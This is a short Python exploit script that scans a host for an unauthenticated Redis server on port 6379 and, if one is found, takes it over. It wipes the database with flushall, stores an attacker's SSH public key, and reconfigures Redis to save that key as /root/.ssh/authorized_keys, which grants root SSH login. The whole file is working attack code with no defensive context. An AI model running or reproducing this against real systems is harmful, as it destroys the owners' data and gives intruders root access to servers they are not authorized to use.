import socket
import redis
import sys

def Usage():
    print('RedisScanner.py 127.0.0.1 key.txt')

def Scan(ip):
    payload="\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((ip, 6379))
        s.sendall(payload.encode())
        recvdata=s.recv(1024).decode()
        if 'redis_version' in recvdata:
            print('[+] %s is vulnerable ' %ip)
            #print(recvdata)
            return True
    except:
        print('[-] %s is not vulnerable ' %ip)
        return False
        pass

def WriteSSHKeygen(ip,sshkey):
    try:
        r = redis.StrictRedis(host=ip, port=6379, db=0, socket_timeout=2)
        r.flushall()
        r.set('crackit', sshkey)
        r.config_set('dir', '/root/.ssh/')
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        print('[+] Write SSHkeygen successful')
    except:
        print('[-] Write SSHkeygen Failed')
        pass


if __name__=='__main__':
    if(len(sys.argv)==3):
        ip=sys.argv[1]
        sshkeyfile=sys.argv[2]
        try:
            with open(sshkeyfile, 'r') as f:
                sshkey = f.read()
        except:
            print('Read SSHkeygen Failed')
            pass

        if Scan(ip):
            WriteSSHKeygen(ip, sshkey)
    else:
        Usage()